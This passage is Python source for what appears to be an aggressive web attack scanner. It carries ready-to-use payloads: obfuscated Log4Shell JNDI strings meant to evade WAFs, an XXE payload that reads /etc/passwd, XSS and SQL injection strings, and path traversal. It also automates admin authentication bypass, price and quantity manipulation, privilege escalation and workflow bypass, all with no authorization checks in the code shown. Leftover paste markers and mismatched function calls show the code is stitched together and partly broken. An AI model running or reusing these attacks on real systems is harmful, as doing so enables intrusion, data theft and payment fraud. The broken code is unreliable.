            resp = requests.get(target, headers=self.headers, timeout=5, verify=False)
            
            # Find all potential Base64 strings
            matches = base64_pattern.findall(resp.text)
            
            import base64
            
            for encoded in list(set(matches)):
                try:
                    # Attempt Decode
                    decoded_bytes = base64.b64decode(encoded)
                    decoded_str = decoded_bytes.decode('utf-8', errors='ignore')
                    
                    # Analyze Decoded Content for Secrets
                    if len(decoded_str) > 5:
                        critical_keywords = ["password", "admin", "root", "db_", "key", "token", "/bin/", "jdbc:"]
                        
                        if any(k in decoded_str.lower() for k in critical_keywords):
                            self._record(results, {
                                "type": "SENSITIVE_DATA_EXPOSURE",
                                "url": target,
                                "param": "ENCODED_STRING",
                                "payload": encoded[:30] + "...", 
                                "details": f"Decoded Base64 revealed sensitive info: {decoded_str[:100]}",
                                "severity": "High"
                            })
                            break # Found one critical leak, move on
                            
                        # Special Check: JWT (JSON Web Token)
                        if "{" in decoded_str and "alg" in decoded_str:
                             self._record(results, {
                                "type": "JWT_EXPOSURE",
                                "url": target,
                                "param": "TOKEN",
                                "payload": encoded[:30] + "...", 
                                "details": "Found exposed JWT token in response body.",
                                "severity": "Medium"
                            })

                except:
                    continue
        except: pass
    
    def _test_log4shell(self, candidate, results):
        """
        [CRITICAL] Log4Shell (CVE-2021-44228)
        Injects JNDI payloads to trigger remote code execution in Java apps.
        """
        target = candidate.get("url")
        if not target: return
        
        # Obfuscated payloads to bypass WAFs
        jndi_payloads = [
            "${jndi:ldap://127.0.0.1:1389/a}",
            "${${::-j}ndi:rmi://127.0.0.1:1099/a}",
            "${jndi:${lower:l}${lower:d}ap://127.0.0.1:1389/a}"
        ]
        
        # We test headers because Log4Shell often triggers there
        headers = self.headers.copy()
        
        for p in jndi_payloads:
            headers.update({
                "User-Agent": p,
                "X-Api-Version": p,
                "Referer": p
            })
            
            try:
                # 1. Header Injection
                requests.get(target, headers=headers, timeout=2, verify=False)
                
                # 2. Parameter Injection
                self._fuzz(candidate, p)
                
                # Note: Real confirmation requires an Out-of-Band (OOB) interaction server.
                # Here we log the attempt. If you see a timeout or 500 error, it's suspicious.
                
            except requests.exceptions.Timeout:
                # A timeout might indicate the server tried to connect to our fake LDAP IP
                self._record(results, {
                    "type": "LOG4SHELL_SUSPICIOUS",
                    "url": target,
                    "param": "HEADERS/PARAMS",
                    "payload": p,
                    "details": "Request timed out after JNDI injection. Potential hit.",
                    "severity": "Critical"
                })
            except Exception:
                return

    def _test_xxe(self, candidate, results):
        param = candidate.get("param", "").lower()
        if not any(x in param for x in ["xml", "data", "body", "content"]):
            return
    
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
    
        resp = self._fuzz(candidate, xxe_payload)
        if not resp or not hasattr(resp, "text"):
            return
    
        if "root:x:0:0" in resp.text or "daemon:x:" in resp.text:
            self._record(results, {
                "type": "XXE_FILE_READ",
                "url": candidate.get("url"),
                "param": candidate.get("param"),
                "payload": "XML_ENTITY_INJECTION",
                "details": "Successfully read /etc/passwd via XXE.",
                "severity": "Critical"
            })
    
    # ==========================================================
    # 🟢 PASTE THESE NEW FUNCTIONS AT THE END OF THE CLASS
    # ==========================================================


    def _test_xss_polyglot(self, candidate, results):
        # [TITAN SNIPER] Context-Breaking Polyglots
        marker = f"titan{random.randint(1000,9999)}"
        payloads = [
            f"<script>alert('{marker}')</script>",
            f"\"><img src=x onerror=alert('{marker}')>", 
            f"<svg/onload=alert('{marker}')>",
            f"javascript:alert('{marker}')//", 
            f"'-alert('{marker}')-'",
            f"{{{{'{marker}'}}}}" # SSTI/Template context
        ]
        
        for p in payloads:
            resp = self._fuzz(candidate, p)
            if resp and marker in resp.text:
                # Heuristic: If our marker is reflected, it's a hit.
                # We check for the marker because browsers might strip 'alert'
                self._record(results, candidate, "XSS_REFLECTED", p)
                break
            
    def _test_business_logic(self, candidate, results):
        """
        [TITAN BUSINESS] Detects Logic Flaws (Price Manipulation, Negative Qty, Admin Escalation).
        Uses 'Contextual Reflection' to confirm the attack worked (Real vs Fake).
        """
        param = candidate.get("param", "").lower()
        
        # ----------------------------------------------------
        # 1. PRICE MANIPULATION (The "Free Shopping" Attack)
        # ----------------------------------------------------
        if any(x in param for x in ["price", "amount", "cost", "total", "balance", "money"]):
            # Attack: Try extremely low positive values and negative values (refund trick)
            attacks = [
                ("0.01", "0.01"),   # Penny Item
                ("0", "0.00"),      # Free Item
                ("-100", "-100")    # Reverse Payment (Refund)
            ]
            
            for payload, confirmation_string in attacks:
                resp = self._fuzz(candidate, payload)
                
                if not resp: continue

                # [CONFIRMATION LOGIC]
                # Real if: Status 200 AND the low price is reflected in the "Total" area
                # Fake if: Status 200 but page shows original price
                
                text_lower = resp.text.lower()
                
                # Check 1: Did the transaction succeed?
                is_success = "success" in text_lower or "thank you" in text_lower or "order id" in text_lower
                
                # Check 2: Was OUR price accepted? (Look for "$0.01" or "0.01")
                is_price_reflected = confirmation_string in resp.text
                
                if resp.status_code in [200, 201] and is_price_reflected and is_success:
                    self._record(results, candidate, "BIZ_LOGIC_PRICE_MANIPULATION", payload)
                    return # Stop after confirmed hit

        # ----------------------------------------------------
        # 2. QUANTITY LOGIC (The "Infinite Inventory" Attack)
        # ----------------------------------------------------
        elif any(x in param for x in ["qty", "quantity", "count", "num", "units"]):
            # Attack: Negative quantity (often creates store credit)
            payload = "-1"
            resp = self._fuzz(candidate, payload)
            
            if resp:
                text_lower = resp.text.lower()
                
                # [CONFIRMATION LOGIC]
                # Real if: We see a negative subtotal or "-1 items"
                # Fake if: Server errors out (500) or converts to 1
                
                if "-1" in resp.text and ("total" in text_lower or "subtotal" in text_lower):
                    # Strict check: Ensure it didn't just reflect the input field value
                    if "price" in text_lower or "cart" in text_lower:
                        self._record(results, candidate, "BIZ_LOGIC_NEGATIVE_QTY", payload)
                        return

        # ----------------------------------------------------
        # 3. PRIVILEGE ESCALATION (Mass Assignment / Parameter Pollution)
        # ----------------------------------------------------
        elif any(x in param for x in ["role", "group", "is_admin", "admin", "level", "permissions", "auth"]):
            # Attack: Try to self-promote to admin
            payloads = ["admin", "administrator", "superuser", "root", "true", "1"]
            
            # Baseline: Get normal page size/content
            baseline = self._fuzz(candidate, "user")
            base_len = len(baseline.text) if baseline else 0
            
            for payload in payloads:
                resp = self._fuzz(candidate, payload)
                if not resp: continue
                
                # [CONFIRMATION LOGIC]
                # Real if: Access to new features (Dashboard, Settings) OR significant response change
                # Fake if: Page looks identical to "user" request
                
                # Check 1: Keywords that only Admins see
                admin_keywords = ["admin dashboard", "manage users", "system settings", "delete user", "sudo"]
                found_keyword = any(k in resp.text.lower() for k in admin_keywords)
                
                # Check 2: Content Length Divergence (>30% difference usually indicates new UI loaded)
                len_diff = abs(len(resp.text) - base_len)
                is_different = len_diff > (base_len * 0.3)
                
                if found_keyword or (is_different and resp.status_code == 200):
                    self._record(results, candidate, "BIZ_LOGIC_PRIVILEGE_ESCALATION", payload)
                    return
    def _test_state_machine_bypass(self, candidate, results):
      """
      [ADVANCED] State Machine / Workflow Bypass
      WAAH Chapter 11
      """
  
      url = candidate.get("url")
      param = candidate.get("param", "").lower()
      orig = candidate.get("orig_value")
  
      if not url or not param:
          return
  
      # Only attack state-like parameters
      if not any(x in param for x in [
          "step", "state", "stage", "status",
          "confirm", "verified", "approved",
          "complete", "final", "success"
      ]):
          return
  
      # -------------------------------
      # BASELINE (normal state)
      # -------------------------------
      base = self._fuzz(candidate, orig)
      if not base:
          return
  
      base_len = len(base.text)
  
      # -------------------------------
      # AGGRESSIVE STATE JUMP
      # -------------------------------
      bypass_values = [
          "final",
          "complete",
          "success",
          "approved",
          "true",
          "1"
      ]
  
      for val in bypass_values:
          resp = self._fuzz(candidate, val)
          if not resp:
              continue
  
          # -------------------------------
          # REAL CONFIRMATION (NO FAKES)
          # -------------------------------
          text = resp.text.lower()
  
          indicators = [
              "order confirmed",
              "payment successful",
              "thank you",
              "completed",
              "dashboard",
              "logout"
          ]
  
          # 🔥 Confirmation logic
          if (
              resp.status_code in (200, 302)
              and any(i in text for i in indicators)
              and abs(len(resp.text) - base_len) > base_len * 0.3
          ):
              self._record(
                  results,
                  candidate,
                  "WORKFLOW_STATE_BYPASS",
                  val
              )
              return
                               
    def _test_admin_auth(self, candidate, results):
        param = candidate.get("param", "").lower()
        # Optimization: Only attack likely login fields
        if not any(x in param for x in ["user", "name", "login", "email"]): return

        for p in self.auth_bypass_payloads:
            resp = self._fuzz(candidate, p)
            if resp:
                # Success if we are redirected to a dashboard or see "Welcome"
                if resp.status_code in [302, 301] and "dashboard" in resp.headers.get("Location", ""):
                    self._record(results, candidate, "ADMIN_BYPASS", p)
                    break
                if "Welcome" in resp.text and "Login" not in resp.text:
                    self._record(results, candidate, "ADMIN_BYPASS", p)
                    break

    def _test_authz_bypass_admin_access(self, candidate, results):
        
        base = urlparse(self.target)
        base_url = f"{base.scheme}://{base.netloc}"
        
        """
        REAL authorization bypass:
        Tests if protected admin endpoints are accessible
        without valid authentication or with low-privilege context.
        """
    
        url = candidate.get("url")
        if not url:
            return
    
        admin_paths = [
            "/admin",
            "/administrator",
            "/dashboard",
            "/manage",
            "/settings",
            "/api/admin",
            "/api/v1/admin",
        ]
    
        base = urlparse(url)
        base_url = f"{base.scheme}://{base.netloc}"
    
        for path in admin_paths:
            target = base_url + path
    
            try:
                # 1️⃣ Unauthenticated request
                r = requests.get(
                    target,
                    headers={"User-Agent": self.headers["User-Agent"]},
                    timeout=5,
                    verify=False,
                    allow_redirects=False
                )
    
                # ✅ REAL confirmation logic
                if r.status_code in (200, 201):
                    if not any(x in r.text.lower() for x in ["login", "signin", "unauthorized"]):
                        self._record(
                            results,
                            candidate,
                            "AUTHZ_ADMIN_ACCESS",
                            payload=path
                        )
                        return
    
            except Exception:
                continue
    
    # ================== [INSERTED LOGIC HERE] ==================

    def _add_vector(self, method: str, url: str, param: str, loc: str, val: Any, tainted: bool = False):
        """Deduplicates attack vectors using SHA-256 fingerprinting."""
        if not param or len(str(param)) > 80:
            return
        path = urlparse(url).path or "/"
        raw_id = f"{method.upper()}|{path}|{param}|{loc}".encode()
        vector_id = hashlib.sha256(raw_id).hexdigest()

        if vector_id not in self.seen_fingerprints:
            self.seen_fingerprints.add(vector_id)
            self.candidates.append({
                "vector_id": vector_id,
                "method": method.upper(),
                "url": url,
                "param": param,
                "name": param,
                "location": loc,
                "orig_value": str(val),
                "tainted": tainted,
                "timestamp": "2026-01-10T16:15:00Z"
            })

    def _flatten_json(self, y: Any, prefix: str = "") -> Dict[str, Any]:
        """Recursively flattens complex API JSON payloads."""
        out = {}
        def flatten(x: Any, name: str = ""):
            if isinstance(x, dict):
                for a in x: flatten(x[a], f"{name}{a}.")
            elif isinstance(x, list):
                for i, a in enumerate(x): flatten(a, f"{name}{i}.")
            else: out[name[:-1]] = x
        flatten(y, prefix)
        return out


    # ================== CORE HELPERS ==================

    def _fuzz(self, candidate: Dict, payload: str):
        url = candidate.get("url")
        method = candidate.get("method", "GET").upper()
        param = candidate.get("param")
        loc = candidate.get("location")
    
        headers = self.headers.copy()
    
        try:
            if loc in ("query", "query_string", "xhr_query"):
                params = dict(parse_qsl(urlparse(url).query))
                params[param] = payload
                return requests.get(
                    url, params=params,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )
    
            elif loc in ("form_input", "body", "xhr_body", "xhr_json"):
                data = {param: payload}
                if method == "POST":
                    return requests.post(
                        url, data=data,
                        headers=headers,
                        timeout=self.timeout,
                        verify=False
                    )
                return requests.get(
                    url, params=data,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )
    
            elif loc == "cookie":
                cookies = {param: payload}
                return requests.get(
                    url, cookies=cookies,
                    headers=headers,
                    timeout=self.timeout,
                    verify=False
                )
    
        except requests.exceptions.RequestException:
            return None
        
    def _cvss_from_proofs(self, proofs: int, base_severity: str):
        """
        Convert number of independent confirmations → CVSS score
        proofs = distinct confirmations (boolean, time, error, DOM, etc.)
        """
        base = {
            "LOW": 3.0,
            "MEDIUM": 5.5,
            "HIGH": 7.5,
            "CRITICAL": 9.0,
        }.get(base_severity.upper(), 5.5)
    
        # Each extra proof hardens the score
        score = base + min(proofs * 0.4, 2.0)  # cap +2.0
        return round(min(score, 10.0), 1)
    
    def _chain_mitre_phase(self, current: dict, existing: list):
        """
        Escalate MITRE tactic if prior phase exists for same URL
        """
        cur_tactic = current.get("mitre", {}).get("tactic")
        if not cur_tactic:
            return current
    
        for prev in existing:
            if prev.get("url") != current.get("url"):
                continue
    
            prev_tactic = prev.get("mitre", {}).get("tactic")
            if prev_tactic == cur_tactic:
                continue
    
            # Phase chaining rule
            if MITRE_CHAIN.get(prev_tactic) == cur_tactic:
                current["mitre"]["chained_from"] = prev_tactic
                current["mitre"]["chain_confidence"] = "validated"
                break
    
        return current

    def _record(self, results, candidate, v_type=None, payload=None):
        """
        Universal recorder.
        SINGLE source of truth for:
        - GUI streaming
        - CVSS scoring
        - MITRE mapping + chaining
        - Proof-based confidence
        """
    
        # -------------------------------
        # Fingerprint (dedupe hard-stop)
        # -------------------------------
        fp = hashlib.md5(
            f"{v_type}{candidate.get('url')}{candidate.get('param')}".encode()
        ).hexdigest()
    
        if fp in self.seen_fingerprints:
            return
    
        self.seen_fingerprints.add(fp)
    
        # -------------------------------
        # Build raw finding
        # -------------------------------
        finding = {
            "type": v_type,
            "url": candidate.get("url"),
            "param": candidate.get("param"),
            "payload": payload,
            "severity": "HIGH" if v_type in [
                "SQLI_TIME_BLIND",
                "LFI_TRAVERSAL",
                "RCE_COMMAND_INJECTION",
                "WORKFLOW_STATE_BYPASS"
            ] else "MEDIUM",
            "confidence": 90 if v_type and "CONFIRMED" in v_type else 60
            if v_type in [
                "SQLI_TIME_BLIND",
                "LFI_TRAVERSAL",
                "RCE_COMMAND_INJECTION",
                "WORKFLOW_STATE_BYPASS"
            ] else "probable",
            "proofs": 1,  # first real confirmation
        }
    
        # -------------------------------
        # Score via ConfidenceScorer
        # -------------------------------
        v = self.scorer.score(finding)
    
        # -------------------------------
        # Stable GUI ID
        # -------------------------------
        v["id"] = int(
            hashlib.md5(
                f"{v.get('url')}{v.get('param')}{v.get('type')}".encode()
            ).hexdigest()[:6],
            16
        )
    
        # -------------------------------
        # MITRE ATT&CK (single injection)
        # -------------------------------
        v["mitre"] = MITRE_AUTO_MAP.get(
            v.get("type"),
            {
                "tactic": "Unknown",
                "technique_id": "T0000",
                "technique": "Unknown",
            }
        )
    
        # -------------------------------
        # MITRE Phase Chaining
        # -------------------------------
        v = self._chain_mitre_phase(v, results)
    
        # -------------------------------
        # CVSS (proof-based, REAL)
        # -------------------------------
        v["cvss"] = {
            "AV": 0,
            "AC": 0,
            "PR": 0,
            "UI": 0,
            "C": 1 if v["severity"] in ("HIGH", "CRITICAL") else 0,
            "I": 1 if v["severity"] in ("HIGH", "CRITICAL") else 0,
            "A": 1 if v["severity"] in ("HIGH", "CRITICAL") else 0,
        }
    
        v["cvss_score"] = self._cvss_from_proofs(
            proofs=v.get("proofs", 1),
            base_severity=v.get("severity", "MEDIUM")
        )
    
        v["cvss_severity"] = v.get("severity", "MEDIUM").upper()
        v["cvss_vector"] = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/C:L/I:L/A:L"
    
        # -------------------------------
        # Normalize confidence (GUI-safe)
        # -------------------------------
        conf = v.get("confidence")
        if isinstance(conf, str):
            v["confidence"] = 90 if conf == "confirmed" else 60
        elif isinstance(conf, (int, float)):
            v["confidence"] = int(conf)
        else:
            v["confidence"] = 60
    
        # -------------------------------
        # Emit (ONCE)
        # -------------------------------
        results.append(v)
        print("[VULN] " + json.dumps(v), flush=True)
    

    def _deduplicate_results(self, results: List) -> List:
        seen = set()
        final = []
    
        for r in results:
            if not isinstance(r, dict):
                continue
    
            v_type = r.get("type") or r.get("vulnerability") or "UNKNOWN"
            url = r.get("url", "")
            param = r.get("param", "")
    
            payload = r.get("payload", "")
            fp = hashlib.md5(f"{v_type}{url}{param}".encode()).hexdigest()


            if fp not in seen:
                seen.add(fp)
                final.append(r)
    
        return final   
    
    def _report_vuln(self, candidate, vuln_type, severity, results, payload="", attack_text=""):
    
        # --- map UI names → scorer names ---
        type_map = {
            "Reflected XSS": "XSS_REFLECTED",
            "Reflected XSS (Confirmed)": "XSS_REFLECTED",
            "SQL Injection": "SQLI_ERROR",
            "SQLi": "SQLI_ERROR",
            "LFI": "LFI_TRAVERSAL",
            "RCE": "RCE_COMMAND_INJECTION",
            "SSTI": "SSTI"
        }
    
        internal_type = type_map.get(vuln_type, vuln_type)
    
        report = {
            "id": None,
            "type": internal_type,   # ✅ MUST match BASE_RULES
    
            "url": candidate.get("url"),
            "param": candidate.get("param"),
            "payload": payload,
    
            "proofs": 5,   # keep your logic same
    
            "details": f"{vuln_type} confirmed via payload reflection"
        }
    
        scored = self.scorer.score(report)
        results.append(scored)
    
        print(f"[✔] CONFIRMED {severity}: {vuln_type}", flush=True)

    # ------------------------------------------------------------
    # 1. ACTIVE RECONNAISSANCE: Nmap Fingerprinting
    # ------------------------------------------------------------
    def run_active_recon(self):
        """
        Safe Active Recon (Academic Mode)
        - Uses nmap ONLY if available
        - Never crashes GUI
        - Never blocks Phase-2
        - Adds LIMITED but REAL infra vectors
        """
    
        # 1️⃣ Run only once
        if self._network_scanned:
            return
        self._network_scanned = True
    
        # 2️⃣ Target must exist
        if not self.target:
            return
    
        parsed = urlparse(self.target)
        host = parsed.hostname
        if not host:
            return
    
        print(f"[PHASE 1] [Infra] Probing host: {host}", flush=True)
    
        # 3️⃣ Minimal, safe port set (academic)
        cmd = [
            "nmap",
            "-sV",
            "-Pn",
            "-p", "80,443,8080,8443",
            host
        ]
    
        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120
            )
        except FileNotFoundError:
            print("[PHASE 1] [Infra] Nmap not installed. Skipping.", flush=True)
            return
        except Exception as e:
            print(f"[PHASE 1] [Infra] Nmap error: {e}", flush=True)
            return
    
        output = proc.stdout or ""
    
        # 4️⃣ Parse ONLY confirmed open services
        for line in output.splitlines():
            line = line.strip()
    
            # Example: 80/tcp open http Apache httpd 2.4.41
            if "/tcp" in line and " open " in line:
                self._add_vector(
                    method="NMAP",
                    url=self.target,
                    param="service",
                    loc="infrastructure",
                    val=line
                )
    
        print("[PHASE 1] [Infra] Recon complete.", flush=True)
    
    # ------------------------------------------------------------
    # 2. AGENTIC HEURISTICS: Intelligent Parameter Discovery
    # ------------------------------------------------------------
    def _apply_agentic_heuristics(self, url: str):
        """Simulates an attacker 'guessing' hidden params that aren't in the HTML."""
        path = urlparse(url).path
        # Example: if path is /api/v1/user, an agentic heuristic adds ?debug=1 or ?admin=true
        for param in self.heuristic_params:
            self._add_vector("GET", url, param, "agentic_heuristic", "predicted_vector")

    # ------------------------------------------------------------
    # 3. TAINT ANALYSIS SIMULATION: Tracking Data Flow
    # ------------------------------------------------------------
    def _simulate_taint_flow(self, param_name: str, location: str):
        """Flags potential paths where untrusted input reaches a sensitive sink."""
        high_risk_sinks = {
            "cmd": "shell", "exec": "shell", "file": "filesystem", 
            "path": "filesystem", "id": "database", "query": "database"
        }
        
        if param_name in high_risk_sinks:
            sink_type = high_risk_sinks[param_name]
            print(f"[!] [Taint Detected] Untrusted {location} input '{param_name}' flows to {sink_type} sink.")
            return True
        return False

    # ------------------------------------------------------------
    # 4. CORE ENGINE UPGRADES
    # ------------------------------------------------------------
    def crawl_and_scan(self):
        """Main execution loop including new advanced modules."""
        try:
            # Step 1: Active Infrastructure Scan
            self.run_active_recon()
             
            self._exploit_rce()
            
            # Step 2: Standard Surface Crawl
            r = requests.get(self.target, timeout=10)
            self.pages.append({"url": self.target, "content": r.text})

            # Step 3: Deep Parameter Mining & Taint Analysis
            for page in self.pages:
                url = page["url"]
                # Discover hidden params via heuristics
                self._apply_agentic_heuristics(url)
                
                # Extract visible params from query string
                parsed = urlparse(url)
                for name, val in parse_qsl(parsed.query):
                    # Simulate taint flow for every discovered param
                    is_tainted = self._simulate_taint_flow(name, "query")
                    self._add_vector("GET", url, name, "query", val, tainted=is_tainted)

        except Exception as e:
            print(f"[!] Scan Error: {e}")

    def get_results(self):
        return self.candidates
    
    def run_aggressive_attack(
        self,
        optimized_vectors: List[Dict[str, Any]],
    ):
        """
        Compatibility wrapper.
    
        Actual Phase-2 attacks and confirmation are handled by:
    
            AttackEngine
            -> AttackExecutor
            -> Detector
            -> VerificationValidator
            -> ValidationOrchestrator
    
        This method does not perform HTTP requests and does not
        independently confirm vulnerabilities.
        """
    
        vector_count = len(
            optimized_vectors or []
        )
    
        print(
            "[PHASE 2] Aggressive attack wrapper delegated to "
            f"primary validation pipeline. vectors={vector_count}",
            flush=True,
        )
    
        return []

    def _smart_payloads(self, param: str) -> list:
        base = [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
        ]
        p = param.lower()
        if any(x in p for x in ["id", "uid", "user"]):
            base += ["' OR 1=1--", "1 UNION SELECT NULL--"]
        if any(x in p for x in ["file", "path", "page"]):
            base += ["../../../../etc/passwd", "../../../../windows/win.ini"]
        if any(x in p for x in ["url", "redirect", "next"]):
            base += ["//google.com", "javascript:alert(1)"]
        return base
    